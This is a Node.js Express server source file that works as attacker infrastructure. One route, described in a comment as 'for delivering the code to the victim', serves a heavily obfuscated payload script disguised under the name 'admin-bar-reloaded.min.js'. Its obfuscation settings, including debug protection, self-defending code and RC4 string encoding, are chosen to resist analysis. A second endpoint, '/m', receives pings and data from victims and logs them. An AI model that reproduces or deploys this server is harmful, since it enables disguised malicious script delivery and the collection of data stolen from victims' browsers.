const express = require("express");
const https = require("https");
const cors = require("cors");

const fs = require("fs");
const path = require("path");

const JavaScriptObfuscator = require("javascript-obfuscator");

const app = express();
const port = 3000;

app.use(cors());
app.use(express.urlencoded({ extended: true }));

// logging
function log(data) {
    const date = new Date();
    const estDate = new Date(date.getTime() - 4 * 60 * 60 * 1000);
    const timestamp = estDate.toISOString().replace("Z", " EST");

    fs.appendFileSync("./log.txt", `[${timestamp}] ${data}\n`);
    console.log(`[${timestamp}] ${data}`);
}

// for delivering the code to the victim
app.get("/admin-bar-reloaded.min.js", (req, res) => {
    // read the payload script
    const data = fs.readFileSync(path.join(__dirname, "payload.js"), "utf8");

    // obfuscate the script before sending it out
    const obfuscated = JavaScriptObfuscator.obfuscate(data, {
        compact: true,
        controlFlowFlattening: true,
        controlFlowFlatteningThreshold: 1,
        deadCodeInjection: true,
        deadCodeInjectionThreshold: 1,
        debugProtection: true,
        debugProtectionInterval: 4000,
        disableConsoleOutput: false,
        identifierNamesGenerator: "hexadecimal",
        log: false,
        numbersToExpressions: true,
        renameGlobals: true,
        selfDefending: true,
        simplify: true,
        splitStrings: true,
        splitStringsChunkLength: 5,
        stringArray: true,
        stringArrayCallsTransform: true,
        stringArrayEncoding: ["rc4"],
        stringArrayIndexShift: true,
        stringArrayRotate: true,
        stringArrayShuffle: true,
        stringArrayWrappersCount: 5,
        stringArrayWrappersChainedCalls: true,
        stringArrayWrappersParametersMaxCount: 5,
        stringArrayWrappersType: "function",
        stringArrayThreshold: 1,
        transformObjectKeys: true,
        unicodeEscapeSequence: false,
    });

    // send the obfuscated code
    res.writeHead(200, { "Content-Type": "text/javascript" });
    res.end(obfuscated.getObfuscatedCode());
});

// for posting data and pings
app.post("/m", (req, res) => {
    if (req.body.l) {
        log(`Received ping from: ${req.body.l}`);
        if (req.body.c) log(`Data: ${req.body.c}`);
    }

    res.status(204).send();
});

// create the HTTPS server
https
    .createServer(
        {
            key: fs.readFileSync("server.key"),
            cert: fs.readFileSync("server.cert"),
        },
        app
    )
    .listen(port, () => {
        console.log(`Server listening on port ${port}`);
    });
